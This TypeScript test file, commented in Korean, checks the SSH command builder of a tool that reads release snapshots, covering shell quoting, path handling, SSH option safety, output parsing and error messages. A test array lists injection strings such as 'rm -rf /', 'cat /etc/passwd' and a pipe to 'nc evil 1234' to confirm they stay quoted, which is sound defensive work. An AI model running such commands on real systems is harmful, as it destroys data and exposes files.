import { test } from 'node:test'
import assert from 'node:assert/strict'
import type { ExecException } from 'node:child_process'
import {
  buildSshArgs,
  formatSshCommand,
  joinRemote,
  listDirsCommand,
  listFilesCommand,
  parseDirListing,
  parseFileEntries,
  quoteRemotePath,
  readFilesCommand,
  chunkPaths,
  chunkSnapshotIds,
  groupBySnapshot,
  parseFileStream,
  shellQuote,
  sshOptions,
} from '../server/source/sshCommands.ts'
import { decodeSshMessage, toSourceError } from '../server/source/sshSource.ts'
import type { SourceError } from '../server/source/types.ts'
import { readSourceConfig } from '../server/api.ts'
import type { SshSourceConfig } from '../src/types.ts'

/**
 * SSH 명령 조립은 전부 순수 함수라 실제 접속 없이 검증한다.
 * (실제 ssh 실행은 execFile 이라는 외부 경계라 여기서 다루지 않는다)
 */

const CONN: SshSourceConfig = {
  mode: 'ssh',
  host: 'build-01',
  port: null,
  user: 'deploy',
  identityFile: '',
  root: '/home/deploy/release',
  encoding: 'auto',
}

/* ---------------- 셸 인용 (주입 방어) ---------------- */

test('작은따옴표로 감싸고 내부 따옴표를 escape 한다', () => {
  assert.equal(shellQuote('plain'), "'plain'")
  assert.equal(shellQuote("it's"), "'it'\\''s'")
  assert.equal(shellQuote('a b'), "'a b'")
})

test('셸 메타문자가 명령으로 새어 나가지 않는다', () => {
  const attacks = [
    '/tmp; rm -rf /',
    '/tmp && cat /etc/passwd',
    '/tmp$(whoami)',
    '/tmp`id`',
    '/tmp|nc evil 1234',
    '/tmp\nrm -rf /',
  ]
  for (const attack of attacks) {
    const quoted = shellQuote(attack)
    // 통째로 한 쌍의 작은따옴표 안에 들어가고, 내부에 escape 되지 않은 따옴표가 없어야 한다
    assert.ok(quoted.startsWith("'") && quoted.endsWith("'"), attack)
    assert.equal(quoted.slice(1, -1).includes("'"), attack.includes("'"), attack)
  }
})

/* ---------------- 틸드(홈) 경로 ---------------- */

test('선행 ~ 는 원격에서 확장되도록 따옴표 밖에 둔다', () => {
  // 작은따옴표 안에 넣으면 셸이 ~ 를 확장하지 않아 리터럴 경로가 되어 버린다
  assert.equal(quoteRemotePath('~/release'), "~/'release'")
  assert.equal(quoteRemotePath('~'), '~')
  assert.equal(quoteRemotePath('~build/release'), "~build/'release'")
  assert.equal(quoteRemotePath('~build'), '~build')
})

test('홈을 "$HOME" 으로 바꾸지 않는다 — 붙여넣을 수 없는 명령이 된다', () => {
  // 큰따옴표·$ 가 들어가면 표시할 때 역슬래시 escape 가 생긴다. 윈도우 PowerShell 은
  // 역슬래시를 escape 로 보지 않고 $HOME 을 먼저 풀어 버려 원격에서 unexpected EOF 가 난다.
  const quoted = quoteRemotePath('~/release')
  assert.equal(quoted.includes('$'), false, quoted)
  assert.equal(quoted.includes('"'), false, quoted)
})

test('틸드 모양이 아니면 통째로 인용한다', () => {
  assert.equal(quoteRemotePath('/abs/path'), "'/abs/path'")
  assert.equal(quoteRemotePath('rel/path'), "'rel/path'")
  // `~$(id)` 처럼 안전 문자셋을 벗어나면 확장을 허용하지 않는다
  assert.equal(quoteRemotePath('~$(id)/x'), "'~$(id)/x'")
})

/* ---------------- 경로 잇기 ---------------- */

test('원격 경로를 이을 때 슬래시가 중복되지 않는다', () => {
  assert.equal(joinRemote('/a', 'b'), '/a/b')
  assert.equal(joinRemote('/a/', 'b'), '/a/b')
  assert.equal(joinRemote('/a//', 'b', 'c/d'), '/a/b/c/d')
  assert.equal(joinRemote('/a'), '/a')
  assert.equal(joinRemote('/a', ''), '/a')
})

/* ---------------- ssh 옵션 ---------------- */

test('BatchMode 를 켜지 않는다 — 키가 없으면 ssh 가 터미널에 직접 묻는다', () => {
  // BatchMode=yes 면 프롬프트 없이 바로 실패해 비밀번호로 접속할 길이 없어진다
  const opts = sshOptions(CONN)
  assert.equal(opts.some((o) => o.startsWith('BatchMode')), false, opts.join(' '))
  assert.ok(opts.some((o) => o.startsWith('ConnectTimeout=')))
})

test('인증을 대신 처리하지 않는다 — 비밀번호 관련 옵션을 만들지 않는다', () => {
  // 인증은 ssh 몫이다 (개인키 · ssh-agent · ~/.ssh/config)
  const joined = sshOptions(CONN).join(' ')
  assert.ok(!/PubkeyAuthentication|PreferredAuthentications|NumberOfPasswordPrompts/.test(joined), joined)
})

test('포트·개인키는 지정했을 때만 붙는다', () => {
  assert.ok(!sshOptions(CONN).includes('-p'))
  assert.ok(!sshOptions(CONN).includes('-i'))

  const full = sshOptions({ ...CONN, port: 2222, identityFile: '/keys/id_ed25519' })
  assert.equal(full[full.indexOf('-p') + 1], '2222')
  assert.equal(full[full.indexOf('-i') + 1], '/keys/id_ed25519')
})

test('argv 는 [옵션..., user@host, 원격명령] 순서다', () => {
  const args = buildSshArgs(CONN, 'ls -1F')
  assert.equal(args[args.length - 2], 'deploy@build-01')
  assert.equal(args[args.length - 1], 'ls -1F')
})

test('호스트 키를 자동 수락하지 않는다', () => {
  // 자동 수락은 중간자 공격을 막지 못한다 — known_hosts 등록은 사람이 한 번 한다
  const joined = sshOptions(CONN).join(' ')
  assert.ok(joined.includes('StrictHostKeyChecking=yes'), joined)
  assert.equal(/StrictHostKeyChecking=(no|accept-new)/.test(joined), false, joined)
})

/* ---------------- 원격 명령 ---------------- */

test('원격 명령에 경로가 인용된 채로 들어간다', () => {
  assert.equal(listDirsCommand('/home/a b'), "ls -1F -- '/home/a b'")
  assert.ok(readFilesCommand('/x', ['y.pc']).includes("cat -- './y.pc'"))
  assert.ok(
    listFilesCommand('/x', ['d']).startsWith("cd '/x' 2>/dev/null && find './d' -type f")
  )
})

test('루트 존재 확인을 위한 별도 명령을 만들지 않는다', () => {
  // 예전엔 `test -d` 로 한 번 더 붙었다. ssh 가 원격 명령의 종료 코드를 그대로 돌려주고
  // 자기 실패는 255 로 알리므로(ssh(1)), 날짜 목록을 읽는 `ls` 하나로 "폴더 없음"과
  // "접속 실패"가 갈린다 — 요청마다 접속이 한 번 줄었다.
  const commands = [listDirsCommand('/x'), listFilesCommand('/x', ['d']), readFilesCommand('/x', ['y.pc'])]
  for (const cmd of commands) assert.equal(/test -d/.test(cmd), false, cmd)
})

test('파일 목록은 GNU 전용 옵션을 쓰지 않는다', () => {
  // -printf(GNU) / stat -c(GNU) 는 AIX·Solaris 에 없다
  const cmd = listFilesCommand('/x', ['d'])
  assert.ok(!cmd.includes('-printf'))
  assert.ok(!cmd.includes('-maxdepth'))
  assert.ok(cmd.includes('-exec cksum {} +'))
  assert.ok(!/md5sum|sha1sum|sha256sum/.test(cmd), 'GNU 전용 해시는 Solaris·AIX 에 없다')
})

/* ---------------- 여러 파일 한 번에 읽기 ---------------- */

test('파일 여러 개를 한 명령에 담는다 — 접속이 파일 수만큼 늘지 않는다', () => {
  const cmd = readFilesCommand('/rel/d', ['ord/a.pc', 'pay/b.pc'])
  assert.ok(cmd.startsWith("cd '/rel/d' 2>/dev/null || exit 0;"), cmd)
  assert.ok(cmd.includes("cat -- './ord/a.pc'"), cmd)
  assert.ok(cmd.includes("cat -- './pay/b.pc'"), cmd)
})

test('경로 앞에 ./ 를 붙인다 — 이름이 - 로 시작해도 옵션으로 읽히지 않는다', () => {
  const cmd = readFilesCommand('/rel/d', ['-rf'])
  assert.ok(cmd.includes("'./-rf'"), cmd)
  assert.ok(!cmd.includes(" -rf"), cmd)
})

test('없는 파일도 자리를 남긴다 — 요청 순서와 결과가 어긋나면 안 된다', () => {
  const cmd = readFilesCommand('/rel/d', ['a.pc'])
  assert.ok(cmd.includes("if [ -f './a.pc' ]"), cmd)
  assert.ok(cmd.includes("else echo '@@-'"), cmd)
})

test('본문 스트림을 요청한 순서대로 자른다', () => {
  const stream = Buffer.from('@@5\nHELLO@@-\n@@0\n@@3\nabc', 'utf8')
  const parts = parseFileStream(stream, 4)
  assert.equal(parts.length, 4)
  assert.equal(Buffer.from(parts[0]!).toString(), 'HELLO')
  assert.equal(parts[1], null) // 없는 파일
  assert.equal(Buffer.from(parts[2]!).toString(), '') // 빈 파일 — 없는 파일과 다르다
  assert.equal(Buffer.from(parts[3]!).toString(), 'abc')
})

test('본문에 @@ 가 들어 있어도 안 깨진다 — 구분자를 찾지 않고 길이로 자른다', () => {
  const body = '@@3\nnot a header'
  const stream = Buffer.from(`@@${Buffer.byteLength(body)}\n${body}`, 'utf8')
  assert.equal(Buffer.from(parseFileStream(stream, 1)[0]!).toString(), body)
})

test('wc -c 가 숫자 앞에 공백을 채워도 읽는다', () => {
  const stream = Buffer.from('@@      2\nhi', 'utf8')
  assert.equal(Buffer.from(parseFileStream(stream, 1)[0]!).toString(), 'hi')
})

test('바이트 수로 자르므로 한글(멀티바이트)이 밀리지 않는다', () => {
  const body = Buffer.from('가나다', 'utf8') // 9바이트 3글자
  const stream = Buffer.concat([
    Buffer.from(`@@${body.length}\n`),
    body,
    Buffer.from('@@2\nok'),
  ])
  const parts = parseFileStream(stream, 2)
  assert.equal(Buffer.from(parts[0]!).toString(), '가나다')
  assert.equal(Buffer.from(parts[1]!).toString(), 'ok')
})

test('스트림이 어긋나면 그 뒤는 전부 없음으로 둔다 — 엉뚱한 내용을 넘기지 않는다', () => {
  // 헤더가 말한 길이보다 실제 바이트가 모자란 경우
  assert.deepEqual(parseFileStream(Buffer.from('@@99\nshort', 'utf8'), 2), [null, null])
  // 헤더로 시작하지 않는 출력 (원격이 엉뚱한 말을 뱉은 경우)
  assert.deepEqual(parseFileStream(Buffer.from('sh: command not found', 'utf8'), 3), [
    null,
    null,
    null,
  ])
  // 접속이 끊겨 아무것도 못 받은 경우
  assert.deepEqual(parseFileStream(new Uint8Array(), 2), [null, null])
})

test('명령이 길어지면 나눈다 — ARG_MAX 를 넘기면 원격 셸이 통째로 죽는다', () => {
  const many = Array.from({ length: 1000 }, (_, i) => `pkg/file_${i}.pc`)
  const chunks = chunkPaths(many)

  assert.ok(chunks.length > 1, '1000개가 한 덩어리로 나오면 안 된다')
  assert.deepEqual(chunks.flat(), many, '나누는 과정에서 빠지거나 순서가 바뀌면 안 된다')
  for (const chunk of chunks) {
    assert.ok(readFilesCommand('/rel/d', chunk).length < 100_000)
  }
})

test('경로가 없으면 접속하지 않는다', () => {
  assert.deepEqual(chunkPaths([]), [])
})

/* ---------------- 출력 파싱 ---------------- */

test('ls -1F 출력에서 디렉터리만 뽑는다', () => {
  const stdout = ['2026-08-01/', '2026-09-01/', 'README.txt', 'run*', 'latest@', ''].join('\n')
  assert.deepEqual(parseDirListing(stdout), ['2026-08-01', '2026-09-01'])
})

test('CRLF 로 와도 디렉터리를 알아본다', () => {
  assert.deepEqual(parseDirListing('a/\r\nb/\r\nc.txt\r\n'), ['a', 'b'])
})

test('cksum 출력을 상대 경로·크기·체크섬으로 바꾼다', () => {
  const stdout = ['3821 120 ./ord/ord_create.pc', '77 45 ./pay/pay_approve.pc'].join('\n')

  assert.deepEqual(parseFileEntries(stdout), [
    { path: 'ord/ord_create.pc', size: 120, checksum: '3821:120' },
    { path: 'pay/pay_approve.pc', size: 45, checksum: '77:45' },
  ])
})

test('체크섬에 크기가 함께 들어간다 — CRC 만 같은 파일을 같다고 보면 변경이 사라진다', () => {
  const [a] = parseFileEntries('12345 100 ./a.pc')
  const [b] = parseFileEntries('12345 101 ./b.pc')
  assert.notEqual(a.checksum, b.checksum, 'CRC 가 같아도 크기가 다르면 달라야 한다')
})

test('./ 로 시작하지 않는 줄과 잡음은 걸러낸다', () => {
  const stdout = [
    '10 20 ./a.pc',
    'find: cannot read directory',
    '30 40 /other/b.pc', // 폴더 밖 경로 — 섞여 들어오면 안 된다
    '165 total',
    '',
  ].join('\n')
  assert.deepEqual(parseFileEntries(stdout), [
    { path: 'a.pc', size: 20, checksum: '10:20' },
  ])
})

test('경로에 공백이 있어도 끊기지 않는다', () => {
  assert.deepEqual(parseFileEntries('9 7 ./ord/my file.pc'), [
    { path: 'ord/my file.pc', size: 7, checksum: '9:7' },
  ])
})

test('~ 루트여도 파일 목록이 비지 않는다', () => {
  // 예전엔 절대 경로로 받아 `~/rel/…` 과 비교했다. 원격은 확장한 `/home/deploy/rel/…` 을
  // 돌려주므로 접속도 되고 폴더도 보이는데 파일만 0개가 됐다 — 원인 찾기 어려운 실패였다.
  const cmd = listFilesCommand('~/rel', ['2026-08-01'])
  assert.ok(cmd.startsWith(`cd ~/'rel' `), cmd)
  assert.ok(cmd.includes(`find './2026-08-01' -type f`), cmd)
  // 원격이 확장한 실제 경로를 몰라도 파싱된다
  assert.deepEqual(parseFileEntries('1 5 ./2026-08-01/ord/a.pc'), [
    { path: '2026-08-01/ord/a.pc', size: 5, checksum: '1:5' },
  ])
})

test('빈 출력·잡음은 빈 목록', () => {
  for (const stdout of ['', '\n\n', 'find: cannot read directory', '  총 0']) {
    assert.deepEqual(parseFileEntries(stdout), [], JSON.stringify(stdout))
  }
})

test('여러 스냅샷을 한 명령으로 훑는다 — 폴더 수만큼 접속하지 않는다', () => {
  const cmd = listFilesCommand('/rel', ['2026-08-01', '2026-09-01'])
  assert.ok(cmd.includes(`find './2026-08-01' './2026-09-01' -type f`), cmd)
  assert.equal(cmd.split('find ').length, 2, 'find 는 한 번만 나와야 한다')
})

test('폴더 이름 앞에도 ./ 를 붙인다 — 이름이 - 로 시작해도 find 옵션이 되지 않는다', () => {
  assert.ok(listFilesCommand('/rel', ['-delete']).includes(`'./-delete'`))
})

test('스냅샷이 아주 많으면 명령을 나눈다', () => {
  const many = Array.from({ length: 250 }, (_, i) => `2026-01-${i}`)
  const chunks = chunkSnapshotIds(many)
  assert.ok(chunks.length > 1)
  assert.deepEqual(chunks.flat(), many)
  assert.deepEqual(chunkSnapshotIds([]), [])
})

test('출력을 스냅샷별로 가른다 — 경로 첫 조각이 폴더 이름이다', () => {
  const entries = parseFileEntries(
    [
      '1 10 ./2026-08-01/ord/a.pc',
      '2 20 ./2026-09-01/pay/b.pc',
      '3 30 ./2026-09-01/pay/c.pc',
    ].join('\n')
  )
  const grouped = groupBySnapshot(entries, ['2026-08-01', '2026-09-01'])

  assert.deepEqual(
    grouped.get('2026-08-01')?.map((f) => f.path),
    ['ord/a.pc']
  )
  assert.deepEqual(
    grouped.get('2026-09-01')?.map((f) => f.path),
    ['pay/b.pc', 'pay/c.pc']
  )
})

test('요청하지 않은 폴더와 루트에 놓인 파일은 버린다', () => {
  const entries = parseFileEntries(
    ['1 10 ./README.txt', '2 20 ./other/x.pc', '3 30 ./2026-08-01/a.pc'].join('\n')
  )
  const grouped = groupBySnapshot(entries, ['2026-08-01'])

  assert.deepEqual([...grouped.keys()], ['2026-08-01'])
  assert.deepEqual(
    grouped.get('2026-08-01')?.map((f) => f.path),
    ['a.pc']
  )
})

test('파일이 없는 스냅샷도 빈 목록으로 자리를 남긴다', () => {
  const grouped = groupBySnapshot([], ['2026-08-01', '2026-09-01'])
  assert.deepEqual(grouped.get('2026-08-01'), [])
  assert.deepEqual(grouped.get('2026-09-01'), [])
})

/* ---------------- 요청 → 소스 설정 ---------------- */

const q = (s: string): URLSearchParams => new URLSearchParams(s)

test('mode 가 없으면 로컬로 본다 (설정 저장 전에도 동작해야 한다)', () => {
  assert.deepEqual(readSourceConfig(q('')), { mode: 'local', root: '', encoding: 'auto' })
  assert.deepEqual(readSourceConfig(q('root=D%3A%2Frel')), {
    mode: 'local',
    root: 'D:/rel',
    encoding: 'auto',
  })
})

test('인코딩 파라미터를 읽고, 모르는 값은 자동으로 둔다', () => {
  assert.equal(readSourceConfig(q('encoding=euc-kr')).encoding, 'euc-kr')
  assert.equal(readSourceConfig(q('encoding=utf-8')).encoding, 'utf-8')
  for (const raw of ['', 'cp949', 'shift_jis', 'AUTO']) {
    assert.equal(readSourceConfig(q(`encoding=${raw}`)).encoding, 'auto', raw)
  }
})

test('ssh 파라미터를 설정으로 읽는다', () => {
  const config = readSourceConfig(
    q('mode=ssh&host=h&user=u&root=%2Frel&port=2222&identityFile=%2Fk%2Fid')
  )
  assert.deepEqual(config, {
    mode: 'ssh',
    host: 'h',
    port: 2222,
    user: 'u',
    identityFile: '/k/id',
    root: '/rel',
    encoding: 'auto',
  })
})

test('포트가 숫자가 아니면 기본값(null)으로 둔다', () => {
  for (const raw of ['abc', '0', '-1', '']) {
    const config = readSourceConfig(q(`mode=ssh&host=h&user=u&root=%2Fr&port=${raw}`))
    assert.equal(config.mode === 'ssh' && config.port, null, raw)
  }
})

/* ---------------- 자격증명이 새어 나가지 않는지 ---------------- */

test('argv 어디에도 비밀번호가 실리지 않는다', () => {
  const args = buildSshArgs(CONN, 'ls')
  assert.ok(!args.some((a) => /password|passwd|pw=|askpass/i.test(a)), args.join(' '))
})

test('auth 파라미터는 더 이상 설정으로 올라오지 않는다', () => {
  // 인증 방식을 고르는 자리가 없어졌다 — 남아 있는 쿼리는 무시한다
  const config = readSourceConfig(q('mode=ssh&host=h&user=u&root=%2Fr&auth=password'))
  assert.equal('auth' in (config as unknown as Record<string, unknown>), false)
})

/* ---------------- 실행한 명령 표시 ---------------- */

/** 소스에 역슬래시를 직접 쓰면 읽기 어려워 상수로 둔다 */
const BS = String.fromCharCode(92)

test('실행한 ssh 명령을 붙여넣을 수 있는 한 줄로 만든다', () => {
  const shown = formatSshCommand(buildSshArgs({ ...CONN, port: 2222 }, listDirsCommand('/home/a b')))
  assert.ok(shown.startsWith('ssh -o ConnectTimeout='), shown)
  assert.ok(shown.includes('-p 2222 deploy@build-01'), shown)
  // 공백이 든 원격 명령은 한 인자로 보이도록 감싼다
  assert.ok(shown.endsWith(`"ls -1F -- '/home/a b'"`), shown)
})

test('옵션·호스트처럼 안전한 인자는 따옴표 없이 둔다 — 읽기 쉬워야 한다', () => {
  const shown = formatSshCommand(buildSshArgs(CONN, 'ls'))
  assert.ok(shown.includes(' -o StrictHostKeyChecking=yes '), shown)
  assert.ok(shown.includes(' deploy@build-01 '), shown)
})

test('붙여넣을 수 있어야 한다 — 표시용 명령에 escape 가 생기지 않는다', () => {
  // 역슬래시·$ 가 섞이면 셸마다 해석이 갈린다. 특히 윈도우 PowerShell 은 역슬래시를
  // escape 로 보지 않고 $ 를 자기가 먼저 풀어 버려, 붙여넣으면 따옴표가 깨진 채
  // 원격으로 넘어가 원격 셸이 `unexpected EOF` 로 죽는다.
  const roots = ['~/release', '~deploy/release', '/data/스냅샷 모음', 'release', '/home/deploy/release']
  for (const root of roots) {
    const commands = [
      listDirsCommand(root),
      listFilesCommand(root, ['2026-08-01', '한글 폴더']),
      readFilesCommand(root, ['ord/a.pc', '한글 파일.pc']),
    ]
    for (const command of commands) {
      const shown = formatSshCommand(buildSshArgs(CONN, command))
      assert.equal(shown.includes(BS), false, shown)
      assert.equal(shown.includes('$'), false, shown)
    }
  }
})

test('원격 경로를 감싼 작은따옴표는 그대로 남는다', () => {
  // 큰따옴표 안의 작은따옴표는 셸이 건드리지 않는다 — 원격에서 같은 뜻이 되려면 살아 있어야 한다
  const shown = formatSshCommand(buildSshArgs(CONN, readFilesCommand('/x', ['y.pc'])))
  assert.ok(shown.includes(`cd '/x'`), shown)
  assert.ok(shown.includes(`cat -- './y.pc'`), shown)
})

test('표시용 명령에도 자격증명이 실리지 않는다', () => {
  const shown = formatSshCommand(buildSshArgs(CONN, listFilesCommand('/rel', ['d'])))
  assert.ok(!/password|passwd|askpass/i.test(shown), shown)
})

/* ---------------- 오류 안내 ---------------- */

const RAN = `ssh deploy@build-01 "ls -1F -- '/rel'"`

/** execFile 이 넘기는 실패 모양을 흉내 낸다 (stderr, 그리고 code·killed 같은 부가 정보) */
const fail = (stderr: string, extra: Partial<ExecException> = {}): SourceError =>
  toSourceError(
    Object.assign(new Error('Command failed: ssh -o ConnectTimeout=10 …'), {
      cmd: 'ssh -o ConnectTimeout=10 …',
      ...extra,
    }),
    stderr,
    RAN
  )

test('어떤 ssh 실패든 실행한 명령을 함께 보여준다', () => {
  // 원격 명령을 이 도구가 조립하므로, 명령을 안 보여주면 무엇이 실패했는지 알 길이 없다
  const cases: [string, Partial<ExecException>][] = [
    ['deploy@build-01: Permission denied (publickey,password).', {}],
    ['Host key verification failed.', {}],
    ['ssh: connect to host build-01 port 22: Connection refused', {}],
    ['bash: find: command not found', {}],
    ['', { killed: true }],
    ['', { code: 'ENOENT' }],
  ]
  for (const [stderr, extra] of cases) {
    const label = JSON.stringify([stderr, extra])
    const { message } = fail(stderr, extra)
    assert.ok(message.includes('실행한 명령:'), label)
    assert.ok(message.includes(RAN), label)
  }
})

test('실패 원인별로 코드를 나눈다 — 고쳐야 할 곳이 다르다', () => {
  assert.equal(fail('deploy@build-01: Permission denied (publickey,password).').code, 'SSH_AUTH_FAILED')
  assert.equal(fail('Host key verification failed.').code, 'SSH_HOST_KEY')
  assert.equal(fail('ssh: connect to host build-01 port 22: Connection refused').code, 'SSH_UNREACHABLE')
  assert.equal(fail('bash: find: command not found').code, 'SSH_FAILED')
  assert.equal(fail('', { code: 'ENOENT' }).code, 'SSH_NOT_FOUND')
  assert.equal(fail('', { killed: true }).code, 'SSH_TIMEOUT')
})

test('시간 초과 안내에 명령이 두 번 찍히지 않는다', () => {
  // stderr 가 비면 error.message 에 argv 가 통째로 들어 있다 — 그대로 쓰면 명령이 중복된다
  const { message } = fail('', { killed: true })
  assert.equal(message.includes('Command failed'), false, message)
  assert.equal(message.split(RAN).length - 1, 1, message)
})

test('stderr 원문을 지우지 않는다 — 진짜 원인은 거기 적혀 있다', () => {
  const stderr = 'ssh: Could not resolve hostname build-01: Name or service not known'
  assert.ok(fail(stderr).message.includes(stderr))
})

/* ---------------- ssh 오류 문구 되돌리기 ---------------- */

/** OpenSSH 가 내보내는 모양 그대로 만든다 — ASCII 밖 바이트는 `\nnn` 리터럴이 된다 */
const visEscaped = (...octals: string[]): string => octals.map((o) => `${BS}${o}`).join('')

test('ssh 가 8진으로 escape 한 한글 오류 문구를 되돌린다', () => {
  // 한국어 윈도우에서는 OS 가 준 CP949 메시지가 통째로 escape 되어 나온다.
  // 인코딩만 바꿔 읽어서는 안 풀리므로 되돌린 뒤 디코딩해야 한다.
  const escaped = visEscaped('276', '313', '267', '301', '301', '370') // 알려진
  const raw = Buffer.from(`ssh: Could not resolve hostname h: ${escaped}.`, 'latin1')
  assert.equal(decodeSshMessage(raw), 'ssh: Could not resolve hostname h: 알려진.')
})

test('escape 가 없는 stderr 는 그대로 둔다', () => {
  for (const text of [
    'Permission denied (publickey,password).',
    'Host key verification failed.',
    'ssh: connect to host build-01 port 22: Connection refused',
  ]) {
    assert.equal(decodeSshMessage(Buffer.from(text, 'utf8')), text)
  }
})

test('UTF-8 로 온 한글은 건드리지 않는다', () => {
  const text = '원격에서 보낸 한글 메시지'
  assert.equal(decodeSshMessage(Buffer.from(text, 'utf8')), text)
})
